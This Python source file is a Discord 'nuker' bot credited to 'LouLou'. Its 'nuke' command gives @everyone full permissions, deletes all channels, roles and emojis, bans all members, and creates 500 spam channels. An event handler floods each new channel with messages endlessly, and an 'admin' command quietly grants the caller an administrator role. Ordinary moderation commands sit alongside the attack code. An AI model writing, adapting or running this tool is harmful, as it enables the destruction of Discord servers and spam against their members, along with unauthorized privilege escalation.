from http import client
from multiprocessing.connection import Client
import discord
from discord.ext import commands
import random
from discord import Permissions
from colorama import *
from pystyle import *
import threading
import asyncio
import os

os.system("cls")

os.system("title Bot config (Nuker created by LouLou)")

print(Colorate.Diagonal(Colors.blue_to_cyan,"""
                                      __          __                 __            
                                     / /_  ____  / /_   ____  __  __/ /_____  _____
                                    / __ \/ __ \/ __/  / __ \/ / / / //_/ _ \/ ___/
                                   / /_/ / /_/ / /_   / / / / /_/ / ,< /  __/ /    
                                  /_.___/\____/\__/  /_/ /_/\__,_/_/|_|\___/_/     
                                              Dev By >_LouLou#0001                
""", 1))

token = input('{}\n[>] {} TOKEN: {}'.format(Fore.RESET, Fore.LIGHTYELLOW_EX, Fore.RESET))
prefix = input('{}\n[>] {} PREFIX: {}'.format(Fore.RESET, Fore.LIGHTYELLOW_EX, Fore.RESET))
Schannel = input('{}\n[>] {} CHANNEL NAME SPAM: {}'.format(Fore.RESET, Fore.LIGHTYELLOW_EX, Fore.RESET))
Smessage = input('{}\n[>] {} MESSAGE SPAM: {}'.format(Fore.RESET, Fore.LIGHTYELLOW_EX, Fore.RESET))
ROWNER = input('{}\n[>] {} Your role name: {}'.format(Fore.RESET, Fore.LIGHTYELLOW_EX, Fore.RESET))
PROFIL = input('{}\n[>] {} status: {}'.format(Fore.RESET, Fore.LIGHTYELLOW_EX, Fore.RESET))
#spam msg and channel

SPAM_CHANNEL =  [Schannel]
SPAM_MESSAGE = [Smessage]
ROLE_OWNER = [ROWNER]



client = commands.Bot(command_prefix=prefix, help_command=None)

os.system(f"title login to : {token}")

os.system("cls")

@client.event
async def on_ready():
    print(Colorate.Diagonal(Colors.blue_to_cyan,"""
                                      __          __                 __            
                                     / /_  ____  / /_   ____  __  __/ /_____  _____
                                    / __ \/ __ \/ __/  / __ \/ / / / //_/ _ \/ ___/
                                   / /_/ / /_/ / /_   / / / / /_/ / ,< /  __/ /    
                                  /_.___/\____/\__/  /_/ /_/\__,_/_/|_|\___/_/     
                                              Dev By >_LouLou#0001                
    """, 1))
    print(Fore.WHITE + '----------------------------------------------------------------------------------------------------------------------')
    print('{}\n                                          [>] {} Bot running... {}\n'.format(Fore.RESET, Fore.CYAN, Fore.RESET))
    print(Fore.BLUE + '                                        - Logged in as ' + client.user.name)
    print(Fore.CYAN + '                                        - Bot ID: ' + str(client.user.id))
    print(Fore.BLUE + f'                                        - {prefix}kick (For kick)\n                                       {Fore.CYAN} - {prefix}ban (for ban)\n                                       {Fore.RESET} {Fore.BLUE}- {prefix}admin (For give you your admin role)\n                                        {Fore.CYAN}- {prefix}nuke (for nuke the server) \n                                        {Fore.BLUE}- {prefix}stop (for stop the bot){Fore.RESET}')
    print(Fore.WHITE + '\n----------------------------------------------------------------------------------------------------------------------\n')
    await client.change_presence(activity=discord.Game(name=f"{PROFIL}"))


#kick all
@client.command(name='kick')
async def kick(ctx, user : discord.User, *reason):
	reason = " ".join(reason)
	await ctx.guild.kick(user, reason = reason)
	await ctx.send(f"{user} à été kick.")


#ban all
@client.command(name='ban')
async def ban(ctx, user : discord.User, *reason):
	reason = " ".join(reason)
	await ctx.guild.ban(user, reason = reason)
	await ctx.send(f"{user} à été ban pour la raison suivante : {reason}.")


#create admin role

@client.command()
async def admin(ctx):
    perms = discord.Permissions(administrator=True)
    role = await ctx.guild.create_role(name=f"{ROLE_OWNER}", permissions=perms)
    await ctx.author.add_roles(role)
    await ctx.message.delete()


#stop bot

@client.command()
async def stop(ctx):

      await ctx.bot.logout()
      print (Fore.GREEN + f"{client.user.name} has logged out successfully." + Fore.RESET)

#big nuke spam channel et msg

@client.command()
async def nuke(ctx):
    await ctx.message.delete()
    guild = ctx.guild
    try:
      role = discord.utils.get(guild.roles, name = "@everyone")
      await role.edit(permissions = Permissions.all())
      print(Fore.MAGENTA + "I have given everyone admin." + Fore.RESET)
    except:
      print(Fore.GREEN + "I was unable to give everyone admin" + Fore.RESET)
    for channel in guild.channels:
      try:
        await channel.delete()
        print(Fore.MAGENTA + f"{channel.name} was deleted." + Fore.RESET)
      except:
        print(Fore.GREEN + f"{channel.name} was NOT deleted." + Fore.RESET)
    for member in guild.members:
     try:
       await member.ban()
       print(Fore.MAGENTA + f"{member.name}#{member.discriminator} Was banned" + Fore.RESET)
     except:
       print(Fore.GREEN + f"{member.name}#{member.discriminator} Was unable to be banned." + Fore.RESET)
    for role in guild.roles:
     try:
       await role.delete()
       print(Fore.MAGENTA + f"{role.name} Has been deleted" + Fore.RESET)
     except:
       print(Fore.GREEN + f"{role.name} Has not been deleted" + Fore.RESET)
    for emoji in list(ctx.guild.emojis):
     try:
       await emoji.delete()
       print(Fore.MAGENTA + f"{emoji.name} Was deleted" + Fore.RESET)
     except:
       print(Fore.GREEN + f"{emoji.name} Wasn't Deleted" + Fore.RESET)
    banned_users = await guild.bans()
    for ban_entry in banned_users:
      user = ban_entry.user
      try:
        await user.unban(f"<@927677190370381834>")
        print(Fore.MAGENTA + f"{user.name}#{user.discriminator} Was successfully unbanned." + Fore.RESET)
      except:
        print(Fore.GREEN + f"{user.name}#{user.discriminator} Was not unbanned." + Fore.RESET)
    await guild.create_text_channel(f"{SPAM_CHANNEL}")
    for channel in guild.text_channels:
        link = await channel.create_invite(max_age = 0, max_uses = 0)
        print(f"New Invite: {link}")
    amount = 500
    for i in range(amount):
       await guild.create_text_channel(random.choice(SPAM_CHANNEL))
    print(f"nuked {guild.name} Successfully.")
    return

@client.event
async def on_guild_channel_create(channel):
  while True:
    await channel.send(random.choice(SPAM_MESSAGE))

#ping

@client.command()
async def ping(ctx):
    await ctx.send(f'*__**Pong!**__*   `{round(client.latency * 1000000)}ms ` 🏓')

#clear

@client.command(name='clear')
async def clear(ctx, nombre : int):
	messages = await ctx.channel.history(limit = nombre + 1).flatten()
	for message in messages:
		await message.delete()

#mute

@client.command(name='mute')
async def mute(ctx, member : discord.Member, *, reason = "Aucune raison n'a été renseigné"):
    mutedRole = await getMutedRole(ctx)
    await member.add_roles(mutedRole, reason = reason)
    await ctx.send(f"{member.mention} a été mute !")

async def createMutedRole(ctx):
    mutedRole = await ctx.guild.create_role(name = "Muted",
                                            permissions = discord.Permissions(
                                                send_messages = False,
                                                speak = False),
                                            reason = "Creation du role Muted pour mute des gens.")
    for channel in ctx.guild.channels:
        await channel.set_permissions(mutedRole, send_messages = False, speak = False)
    return mutedRole

async def getMutedRole(ctx):
    roles = ctx.guild.roles
    for role in roles:
        if role.name == "Muted":
            return role
    
    return await createMutedRole(ctx)

#run

client.run(token, bot=True)
